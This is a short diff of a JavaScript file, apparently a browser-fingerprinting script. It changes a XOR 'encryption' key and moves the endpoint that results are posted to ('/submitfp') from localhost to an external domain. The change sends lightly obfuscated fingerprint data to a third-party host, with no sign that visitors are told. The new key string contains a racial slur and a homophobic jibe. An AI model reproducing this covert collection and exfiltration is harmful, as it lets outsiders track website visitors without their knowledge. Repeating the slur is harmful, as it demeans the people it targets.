@@ -4010,13 +4010,13 @@ function xorEncrypt(data, key) {
 function enc(data) {
     let cleartext = btoa(unescape(encodeURIComponent(data)))
 
-    let enc = xorEncrypt(cleartext, 'test')
+    let enc = xorEncrypt(cleartext, 'lmaonikoontopniggauwusogay')
 
     return btoa(unescape(encodeURIComponent(enc)))
 }
 
 function postResult(data) {
-    fetch('http://localhost:8080/submitfp', {
+    fetch('https://nikolahellatrigger.solutions/submitfp', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
